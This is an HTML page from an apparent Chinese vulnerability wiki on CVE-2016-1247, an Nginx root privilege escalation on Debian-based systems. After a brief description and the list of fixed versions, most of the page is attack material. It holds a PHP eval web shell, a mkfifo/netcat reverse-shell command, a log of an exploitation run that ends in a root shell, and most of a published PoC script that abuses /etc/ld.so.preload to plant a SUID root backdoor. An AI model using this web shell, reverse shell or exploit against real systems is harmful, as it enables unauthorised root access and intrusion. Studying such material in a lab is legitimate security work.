<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Nginx/%EF%BC%88CVE-2016-1247%EF%BC%89Nginx%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2016-1247）Nginx 提权漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2016-1247\uff09Nginx \u63d0\u6743\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2017-7529%EF%BC%89Nginx%20%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2017-7529%EF%BC%89Nginx%20%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2017-7529）Nginx 越界读取缓存漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2013-4547%EF%BC%89Nginx%20URI%20Processing%20%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2013-4547%EF%BC%89Nginx%20URI%20Processing%20%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2013-4547）Nginx URI Processing 安全绕过漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2016-1247nginx">（CVE-2016-1247）Nginx 提权漏洞<a class="headerlink" href="#cve-2016-1247nginx" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>漏洞原因是在打包nginx时，设置的日志目录的所有者为 www-data
，导致一个低权限账户可以利用软链接的帮助达到提权。所以修复也是将日志的所有者改为root即可。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Debian: Fixed in Nginx 1.6.2-5+deb8u3</p>
<p>Ubuntu:</p>
<p>Fixed in the following updated Nginx package versions on Ubuntu:</p>
<p>Ubuntu 16.04 LTS: 1.10.0-0ubuntu0.16.04.3</p>
<p>Ubuntu 14.04 LTS: 1.4.6-1ubuntu3.6</p>
<p>Ubuntu 16.10: 1.10.1-0ubuntu1.1</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><code>docker run -d -i --name CVE-2016-1247 -p 80:80 xk0n/cve-2016-1247
</code></pre></div>

<p>在容器里配置了 nginx + php 的环境，并有一个一句话木马
<code>/var/www/backdoor.php</code></p>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;</span><span class="vm">?</span><span class="n">php</span>
<span class="nv">@eval</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="o">[</span><span class="n">c</span><span class="o">]</span><span class="p">);</span>
<span class="vm">?</span><span class="o">&gt;</span>
</code></pre></div>

<p>可以用<a href="https://github.com/antoor/antSword">antSword</a>连接测试，用下面的语句可以反弹回一个shell</p>
<div class="codehilite"><pre><span></span><code>mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i 2&gt;&amp;1 | nc &lt;target IP&gt; &lt;port&gt; &gt;/tmp/bd
</code></pre></div>

<p>测试时发现gcc编译出错，可以在本地编译一个后上传。poc运行后会等待
logrotate 此时可以用下面的命令，人工触发条件。</p>
<div class="codehilite"><pre><span></span><code><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">sbin</span><span class="o">/</span><span class="k">logrotate</span><span class="w"> </span><span class="o">-</span><span class="nv">vf</span><span class="w"> </span><span class="o">/</span><span class="nv">etc</span><span class="o">/</span><span class="k">logrotate</span>.<span class="nv">d</span><span class="o">/</span><span class="nv">nginx</span>
</code></pre></div>

<p>测试记录如下：</p>
<div class="codehilite"><pre><span></span><code>$ <span class="n">bash</span> ./<span class="n">cve-2016-1247-poc</span>.<span class="n">sh</span> /<span class="n">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">error</span>.<span class="nb">log</span>
 <span class="n">_______________________________</span>
&lt; <span class="n">Is</span> <span class="n">your</span> <span class="n">server</span> (<span class="n">N</span>)<span class="n">jinxed</span> ? ;<span class="n">o</span> &gt;
 -------------------------------
           \ 
            \          <span class="n">__---__</span>
                    <span class="n">_-</span>       /--<span class="n">______</span>
               <span class="n">__--</span>(<span class="sr"> /     \ )XXXXXXXXXXX\v.  </span>
<span class="sr">             .-XXX(   O   O  )XXXXXXXXXXXXXXX- </span>
<span class="sr">            /</span><span class="n">XXX</span>(       <span class="n">U</span>     )        <span class="n">XXXXXXX</span>\ 
          /<span class="n">XXXXX</span>(              )--<span class="n">_</span>  <span class="n">XXXXXXXXXXX</span>\ 
         /<span class="n">XXXXX</span>/ (      <span class="n">O</span>     )   <span class="n">XXXXXX</span>   \<span class="n">XXXXX</span>\ 
         <span class="n">XXXXX</span>/   /            <span class="n">XXXXXX</span>   \<span class="n">__</span> \<span class="n">XXXXX</span>
         <span class="n">XXXXXX__</span>/          <span class="n">XXXXXX</span>         \<span class="n">__----</span>&gt;
 ---<span class="n">___</span>  <span class="n">XXX__</span>/          <span class="n">XXXXXX</span>      \<span class="n">__</span>         /
   \-  --<span class="n">__</span>/   <span class="n">___</span>/\  <span class="n">XXXXXX</span>            /  <span class="n">___--</span>/=
    \-\    <span class="n">___</span>/    <span class="n">XXXXXX</span>              &#39;--- <span class="n">XXXXXX</span>
       \-\/<span class="n">XXX</span>\ <span class="n">XXXXXX</span>                      /<span class="n">XXXXX</span>
         \<span class="n">XXXXXXXXX</span>   \                    /<span class="n">XXXXX</span>/
          \<span class="n">XXXXXX</span>      &gt;                 <span class="n">_</span><span class="o">/</span><span class="n">XXXXX</span>/
            \<span class="n">XXXXX--__</span>/              <span class="n">__--</span> <span class="n">XXXX</span>/
             -<span class="n">XXXXXXXX---------------</span>  <span class="n">XXXXXX-</span>
                \<span class="n">XXXXXXXXXXXXXXXXXXXXXXXXXX</span>/
                  <span class="s">&quot;&quot;</span><span class="n">VXXXXXXXXXXXXXXXXXXV</span><span class="s">&quot;&quot;</span>

<span class="n">Nginx</span> (<span class="n">Debian-based</span> <span class="n">distros</span>) - <span class="n">Root</span> <span class="n">Privilege</span> <span class="n">Escalation</span> <span class="n">PoC</span> <span class="n">Exploit</span> (<span class="n">CVE-2016-1247</span>) 
<span class="n">nginxed-root</span>.<span class="n">sh</span> (<span class="n">ver</span>. <span class="mf">1.0</span>)

<span class="n">Discovered</span> <span class="o">and</span> <span class="n">coded</span> <span class="n">by:</span>

<span class="n">Dawid</span> <span class="n">Golunski</span> 
<span class="n">https:</span>//<span class="n">legalhackers</span>.<span class="n">com</span>

[+] <span class="n">Starting</span> <span class="n">the</span> <span class="n">exploit</span> <span class="n">as:</span> 
<span class="n">uid</span>=<span class="mi">33</span>(<span class="n">www-data</span>) <span class="n">gid</span>=<span class="mi">33</span>(<span class="n">www-data</span>) <span class="n">groups</span>=<span class="mi">33</span>(<span class="n">www-data</span>)

[+] <span class="n">Backdoor</span><span class="o">/</span><span class="n">low-priv</span> <span class="nb">shell</span> <span class="n">installed</span> <span class="n">at:</span> 
-<span class="n">rwxr-xr-x</span> <span class="mi">1</span> <span class="n">www-data</span> <span class="n">www-data</span> <span class="mi">1021112</span> <span class="n">Nov</span> <span class="mi">19</span> <span class="mi">13</span>:<span class="mi">44</span> /<span class="n">tmp</span><span class="o">/</span><span class="n">nginxrootsh</span>

[+] <span class="n">The</span> <span class="n">server</span> <span class="n">appears</span> <span class="nb">to</span> <span class="n">be</span> (<span class="n">N</span>)<span class="n">jinxed</span> (<span class="n">writable</span> <span class="n">logdir</span>) ! :) <span class="n">Symlink</span> <span class="n">created</span> <span class="n">at:</span> 
<span class="n">lrwxrwxrwx</span> <span class="mi">1</span> <span class="n">www-data</span> <span class="n">www-data</span> <span class="mi">18</span> <span class="n">Nov</span> <span class="mi">19</span> <span class="mi">13</span>:<span class="mi">44</span> /<span class="n">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">error</span>.<span class="nb">log</span> -&gt; /<span class="n">etc</span><span class="o">/</span><span class="n">ld</span>.<span class="nb">so</span>.<span class="n">preload</span>

[+] <span class="n">Waiting</span> <span class="k">for</span> <span class="n">Nginx</span> <span class="n">service</span> <span class="nb">to</span> <span class="n">be</span> <span class="n">restarted</span> (-<span class="n">USR1</span>) <span class="n">by</span> <span class="n">logrotate</span> <span class="n">called</span> <span class="nb">from</span> <span class="n">cron</span>.<span class="n">daily</span> <span class="nb">at</span> <span class="mi">6</span>:<span class="mi">25</span><span class="n">am</span>...
[+] <span class="n">Nginx</span> <span class="n">restarted</span>. <span class="n">The</span> /<span class="n">etc</span><span class="o">/</span><span class="n">ld</span>.<span class="nb">so</span>.<span class="n">preload</span> <span class="nb">file</span> <span class="nb">got</span> <span class="n">created</span> <span class="k">with</span> <span class="n">web</span> <span class="n">server</span> <span class="n">privileges:</span> 
-<span class="n">rw-r--r--</span> <span class="mi">1</span> <span class="n">www-data</span> <span class="n">root</span> <span class="mi">19</span> <span class="n">Nov</span> <span class="mi">19</span> <span class="mi">13</span>:<span class="mi">45</span> /<span class="n">etc</span><span class="o">/</span><span class="n">ld</span>.<span class="nb">so</span>.<span class="n">preload</span>

[+] <span class="n">Adding</span> /<span class="n">tmp</span><span class="o">/</span><span class="n">privesclib</span>.<span class="nb">so</span> <span class="n">shared</span> <span class="n">lib</span> <span class="nb">to</span> /<span class="n">etc</span><span class="o">/</span><span class="n">ld</span>.<span class="nb">so</span>.<span class="n">preload</span>

[+] <span class="n">The</span> /<span class="n">etc</span><span class="o">/</span><span class="n">ld</span>.<span class="nb">so</span>.<span class="n">preload</span> <span class="nb">file</span> <span class="nb">now</span> <span class="n">contains:</span> 
/<span class="n">tmp</span><span class="o">/</span><span class="n">privesclib</span>.<span class="nb">so</span>

[+] <span class="n">Escalating</span> <span class="n">privileges</span> <span class="n">via</span> <span class="n">the</span> /<span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sudo</span> <span class="n">SUID</span> <span class="n">binary</span> <span class="nb">to</span> <span class="nb">get</span> <span class="n">root</span>!
-<span class="n">rwsrwxrwx</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">1021112</span> <span class="n">Nov</span> <span class="mi">19</span> <span class="mi">13</span>:<span class="mi">44</span> /<span class="n">tmp</span><span class="o">/</span><span class="n">nginxrootsh</span>

[+] <span class="n">Rootshell</span> <span class="nb">got</span> <span class="n">assigned</span> <span class="n">root</span> <span class="n">SUID</span> <span class="n">perms</span> <span class="n">at:</span> 
-<span class="n">rwsrwxrwx</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">1021112</span> <span class="n">Nov</span> <span class="mi">19</span> <span class="mi">13</span>:<span class="mi">44</span> /<span class="n">tmp</span><span class="o">/</span><span class="n">nginxrootsh</span>

<span class="n">The</span> <span class="n">server</span> <span class="k">is</span> (<span class="n">N</span>)<span class="n">jinxed</span> ! ;) <span class="n">Got</span> <span class="n">root</span> <span class="n">via</span> <span class="n">Nginx</span>!

[+] <span class="n">Spawning</span> <span class="n">the</span> <span class="n">rootshell</span> /<span class="n">tmp</span><span class="o">/</span><span class="n">nginxrootsh</span> <span class="nb">now</span>!

<span class="n">nginxrootsh:</span> <span class="n">cannot</span> <span class="n">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> (<span class="mi">1156</span>): <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
<span class="n">nginxrootsh:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="nb">in</span> <span class="n">this</span> <span class="nb">shell</span>
<span class="n">nginxrootsh-4</span><span class="mf">.3</span><span class="c1"># id</span>
<span class="nb">id</span>
<span class="n">uid</span>=<span class="mi">33</span>(<span class="n">www-data</span>) <span class="n">gid</span>=<span class="mi">33</span>(<span class="n">www-data</span>) <span class="n">euid</span>=<span class="mi">0</span>(<span class="n">root</span>) <span class="n">groups</span>=<span class="mi">0</span>(<span class="n">root</span>),<span class="mi">33</span>(<span class="n">www-data</span>)
<span class="n">nginxrootsh-4</span><span class="mf">.3</span><span class="c1"># whoami</span>
<span class="n">whoami</span>
<span class="n">root</span>
<span class="n">nginxrootsh-4</span><span class="mf">.3</span><span class="c1"># whoami</span>
<span class="n">whoami</span>
<span class="n">root</span>
</code></pre></div>

<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/bin/bash</span>
<span class="c1">#</span>
<span class="c1"># Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit</span>
<span class="c1"># nginxed-root.sh (ver. 1.0)</span>
<span class="c1">#</span>
<span class="c1"># CVE-2016-1247</span>
<span class="c1">#</span>
<span class="c1"># Discovered and coded by:</span>
<span class="c1">#</span>
<span class="c1"># Dawid Golunski</span>
<span class="c1"># dawid[at]legalhackers.com</span>
<span class="c1">#</span>
<span class="c1"># https://legalhackers.com</span>
<span class="c1">#</span>
<span class="c1"># Follow https://twitter.com/dawid_golunski for updates on this advisory.</span>
<span class="c1">#</span>
<span class="c1"># ---</span>
<span class="c1"># This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu</span>
<span class="c1"># etc.) to escalate their privileges from nginx web server user (www-data) to root </span>
<span class="c1"># through unsafe error log handling.</span>
<span class="c1">#</span>
<span class="c1"># The exploit waits for Nginx server to be restarted or receive a USR1 signal.</span>
<span class="c1"># On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)</span>
<span class="c1"># script which is called daily by the cron.daily on default installations.</span>
<span class="c1"># The restart should take place at 6:25am which is when cron.daily executes.</span>
<span class="c1"># Attackers can therefore get a root shell automatically in 24h at most without any admin</span>
<span class="c1"># interaction just by letting the exploit run till 6:25am assuming that daily logrotation </span>
<span class="c1"># has been configured. </span>
<span class="c1">#</span>
<span class="c1">#</span>
<span class="c1"># Exploit usage:</span>
<span class="c1"># ./nginxed-root.sh path_to_nginx_error.log </span>
<span class="c1">#</span>
<span class="c1"># To trigger logrotation for testing the exploit, you can run the following command:</span>
<span class="c1">#</span>
<span class="c1"># /usr/sbin/logrotate -vf /etc/logrotate.d/nginx</span>
<span class="c1">#</span>
<span class="c1"># See the full advisory for details at:</span>
<span class="c1"># https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</span>
<span class="c1">#</span>
<span class="c1"># Video PoC:</span>
<span class="c1"># https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</span>
<span class="c1">#</span>
<span class="c1">#</span>
<span class="c1"># Disclaimer:</span>
<span class="c1"># For testing purposes only. Do no harm.</span>
<span class="c1">#</span>

<span class="nv">BACKDOORSH</span><span class="o">=</span><span class="s2">&quot;/bin/bash&quot;</span>
<span class="nv">BACKDOORPATH</span><span class="o">=</span><span class="s2">&quot;/tmp/nginxrootsh&quot;</span>
<span class="nv">PRIVESCLIB</span><span class="o">=</span><span class="s2">&quot;/tmp/privesclib.so&quot;</span>
<span class="nv">PRIVESCSRC</span><span class="o">=</span><span class="s2">&quot;/tmp/privesclib.c&quot;</span>
<span class="nv">SUIDBIN</span><span class="o">=</span><span class="s2">&quot;/usr/bin/sudo&quot;</span>

<span class="k">function</span><span class="w"> </span>cleanexit<span class="w"> </span><span class="o">{</span>
<span class="w">    </span><span class="c1"># Cleanup </span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Cleaning up...&quot;</span>
<span class="w">    </span>rm<span class="w"> </span>-f<span class="w"> </span><span class="nv">$PRIVESCSRC</span>
<span class="w">    </span>rm<span class="w"> </span>-f<span class="w"> </span><span class="nv">$PRIVESCLIB</span>
<span class="w">    </span>rm<span class="w"> </span>-f<span class="w"> </span><span class="nv">$ERRORLOG</span>
<span class="w">    </span>touch<span class="w"> </span><span class="nv">$ERRORLOG</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-f<span class="w"> </span>/etc/ld.so.preload<span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">        </span><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span>&gt;<span class="w"> </span>/etc/ld.so.preload
<span class="w">    </span><span class="k">fi</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Job done. Exiting with code </span><span class="nv">$1</span><span class="s2"> \n&quot;</span>
<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="nv">$1</span>
<span class="o">}</span>

<span class="k">function</span><span class="w"> </span>ctrl_c<span class="o">()</span><span class="w"> </span><span class="o">{</span>
<span class="w">        </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Ctrl+C pressed&quot;</span>
<span class="w">    </span>cleanexit<span class="w"> </span><span class="m">0</span>
<span class="o">}</span>

<span class="c1">#intro</span>

cat<span class="w"> </span><span class="s">&lt;&lt;_eascii_</span>
<span class="s"> _______________________________</span>
<span class="s">&lt; Is your server (N)jinxed ? ;o &gt;</span>
<span class="s"> -------------------------------</span>
<span class="s">           \ </span>
<span class="s">            \          __---__</span>
<span class="s">                    _-       /--______</span>
<span class="s">               __--( /     \ )XXXXXXXXXXX\v.  </span>
<span class="s">             .-XXX(   O   O  )XXXXXXXXXXXXXXX- </span>
<span class="s">            /XXX(       U     )        XXXXXXX\ </span>
<span class="s">          /XXXXX(              )--_  XXXXXXXXXXX\ </span>
<span class="s">         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ </span>
<span class="s">         XXXXX/   /            XXXXXX   \__ \XXXXX</span>
<span class="s">         XXXXXX__/          XXXXXX         \__----&gt;</span>
<span class="s"> ---___  XXX__/          XXXXXX      \__         /</span>
<span class="s">   \-  --__/   ___/\  XXXXXX            /  ___--/=</span>
<span class="s">    \-\    ___/    XXXXXX              &#39;--- XXXXXX</span>
<span class="s">       \-\/XXX\ XXXXXX                      /XXXXX</span>
<span class="s">         \XXXXXXXXX   \                    /XXXXX/</span>
<span class="s">          \XXXXXX      &gt;                 _/XXXXX/</span>
<span class="s">            \XXXXX--__/              __-- XXXX/</span>
<span class="s">             -XXXXXXXX---------------  XXXXXX-</span>
<span class="s">                \XXXXXXXXXXXXXXXXXXXXXXXXXX/</span>
<span class="s">                  &quot;&quot;VXXXXXXXXXXXXXXXXXXV&quot;&quot;</span>
<span class="s">_eascii_</span>

<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\033[94m \nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \nnginxed-root.sh (ver. 1.0)\n&quot;</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m&quot;</span>

<span class="c1"># Args</span>
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$#</span><span class="w"> </span>-lt<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[!] Exploit usage: \n\n</span><span class="nv">$0</span><span class="s2"> path_to_error.log \n&quot;</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;It seems that this server uses: `ps aux | grep nginx | awk -F&#39;log-error=&#39; &#39;{ print </span><span class="nv">$2</span><span class="s2"> }&#39; | cut -d&#39; &#39; -f1 | grep &#39;/&#39;`\n&quot;</span>
<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">3</span>
<span class="k">fi</span>

<span class="c1"># Priv check</span>

<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Starting the exploit as: \n\033[94m`id`\033[0m&quot;</span>
id<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span>www-data
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$?</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[!] You need to execute the exploit as www-data user! Exiting.\n&quot;</span>
<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">3</span>
<span class="k">fi</span>

<span class="c1"># Set target paths</span>
<span class="nv">ERRORLOG</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span>
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>!<span class="w"> </span>-f<span class="w"> </span><span class="nv">$ERRORLOG</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[!] The specified Nginx error log (</span><span class="nv">$ERRORLOG</span><span class="s2">) doesn&#39;t exist. Try again.\n&quot;</span>
<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">3</span>
<span class="k">fi</span>

<span class="c1"># [ Exploitation ]</span>

<span class="nb">trap</span><span class="w"> </span>ctrl_c<span class="w"> </span>INT
<span class="c1"># Compile privesc preload library</span>
<span class="c1"># echo -e &quot;\n[+] Compiling the privesc shared library ($PRIVESCSRC)&quot;</span>
<span class="c1"># cat &lt;&lt;_solibeof_&gt;$PRIVESCSRC</span>
<span class="c1"># #define _GNU_SOURCE</span>
<span class="c1"># #include &lt;stdio.h&gt;</span>
<span class="c1"># #include &lt;sys/stat.h&gt;</span>
<span class="c1"># #include &lt;unistd.h&gt;</span>
<span class="c1"># #include &lt;dlfcn.h&gt;</span>
<span class="c1">#        #include &lt;sys/types.h&gt;</span>
<span class="c1">#        #include &lt;sys/stat.h&gt;</span>
<span class="c1">#        #include &lt;fcntl.h&gt;</span>

<span class="c1"># uid_t geteuid(void) {</span>
<span class="c1">#     static uid_t  (*old_geteuid)();</span>
<span class="c1">#     old_geteuid = dlsym(RTLD_NEXT, &quot;geteuid&quot;);</span>
<span class="c1">#     if ( old_geteuid() == 0 ) {</span>
<span class="c1">#         chown(&quot;$BACKDOORPATH&quot;, 0, 0);</span>
<span class="c1">#         chmod(&quot;$BACKDOORPATH&quot;, 04777);</span>
<span class="c1">#         unlink(&quot;/etc/ld.so.preload&quot;);</span>
<span class="c1">#     }</span>
<span class="c1">#     return old_geteuid();</span>
<span class="c1"># }</span>
<span class="c1"># _solibeof_</span>
<span class="c1"># /bin/bash -c &quot;gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl&quot;</span>
<span class="c1"># if [ $? -ne 0 ]; then</span>
<span class="c1">#     echo -e &quot;\n[!] Failed to compile the privesc lib $PRIVESCSRC.&quot;</span>
<span class="c1">#     cleanexit 2;</span>
<span class="c1"># fi</span>


<span class="c1"># Prepare backdoor shell</span>
cp<span class="w"> </span><span class="nv">$BACKDOORSH</span><span class="w"> </span><span class="nv">$BACKDOORPATH</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Backdoor/low-priv shell installed at: \n`ls -l </span><span class="nv">$BACKDOORPATH</span><span class="s2">`&quot;</span>

<span class="c1"># Safety check</span>
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-f<span class="w"> </span>/etc/ld.so.preload<span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[!] /etc/ld.so.preload already exists. Exiting for safety.&quot;</span>
<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">2</span>
<span class="k">fi</span>

<span class="c1"># Symlink the log file</span>
rm<span class="w"> </span>-f<span class="w"> </span><span class="nv">$ERRORLOG</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>ln<span class="w"> </span>-s<span class="w"> </span>/etc/ld.so.preload<span class="w"> </span><span class="nv">$ERRORLOG</span>
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$?</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[!] Couldn&#39;t remove the </span><span class="nv">$ERRORLOG</span><span class="s2"> file or create a symlink.&quot;</span>
<span class="w">    </span>cleanexit<span class="w"> </span><span class="m">3</span>
<span class="k">fi</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] The server appears to be \033[94m(N)jinxed\033[0m (writable logdir) ! :) Symlink created at: \n`ls -l </span><span class="nv">$ERRORLOG</span><span class="s2">`&quot;</span>

<span class="c1"># Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered</span>
curl<span class="w"> </span>http://localhost/<span class="w"> </span>&gt;/dev/null<span class="w"> </span><span class="m">2</span>&gt;/dev/null
<span class="c1"># Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily </span>
<span class="c1"># rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)</span>
<span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="s2">&quot;\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...&quot;</span>
<span class="k">while</span><span class="w"> </span>:<span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>
<span class="w">    </span>sleep<span class="w"> </span><span class="m">1</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-f<span class="w"> </span>/etc/ld.so.preload<span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$PRIVESCLIB</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/ld.so.preload
<span class="w">        </span>rm<span class="w"> </span>-f<span class="w"> </span><span class="nv">$ERRORLOG</span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="k">fi</span>
<span class="k">done</span>

<span class="c1"># /etc/ld.so.preload should be owned by www-data user at this point</span>
<span class="c1"># Inject the privesc.so shared library to escalate privileges</span>
<span class="nb">echo</span><span class="w"> </span><span class="nv">$PRIVESCLIB</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/ld.so.preload
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \n`ls -l /etc/ld.so.preload`&quot;</span>
